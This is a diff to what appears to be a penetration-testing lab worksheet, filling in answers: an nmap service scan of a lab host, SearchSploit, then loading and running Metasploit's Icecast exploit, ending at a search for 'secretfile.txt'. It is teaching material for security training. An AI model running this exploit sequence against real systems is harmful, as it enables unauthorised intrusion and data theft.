@@ -49,9 +49,8 @@ You've been provided full access to the network and are getting ping responses f
  
 1. Perform a service and version scan using Nmap to determine which services are up and running:
 
-    - Run the Nmap command that performs a service and version scan against the target.
-
-      > Answer: 
+  - Run the Nmap comman that performs a service and version scan against the target.
+     > Answer: nmap -sV 192.168.0.8
  
  
 2. From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:
@@ -59,39 +58,40 @@ You've been provided full access to the network and are getting ping responses f
    - Run the SearchSploit commands to show available Icecast exploits.
   
      > Answer: 
+![screenshot]()
 
 3. Now that we know which exploits are available to us, let's start Metasploit:
  
    - Run the command that starts Metasploit:
     
-     > Answer: 
+     > Answer: msfconsole
  
  
 4. Search for the Icecast module and load it for use.
  
    - Run the command to search for the Icecast module:
      
-     > Answer:
+     > Answer: search icecast
  
 
    - Run the command to use the Icecast module:
 
        **Note:** Instead of copying the entire path to the module, you can use the number in front of it.
 
-     > Answer: 
+     > Answer: use 0
  
  
 5. Set the `RHOST` to the target machine.
  
    - Run the command that sets the `RHOST`:
       
-     > Answer: 
+     > Answer: set RHOST 192.168.0.8
  
 6. Run the Icecast exploit.
  
    - Run the command that runs the Icecast exploit.
       
-     > Answer: 
+     > Answer: run
  
    - Run the command that performs a search for the `secretfile.txt` on the target.
       
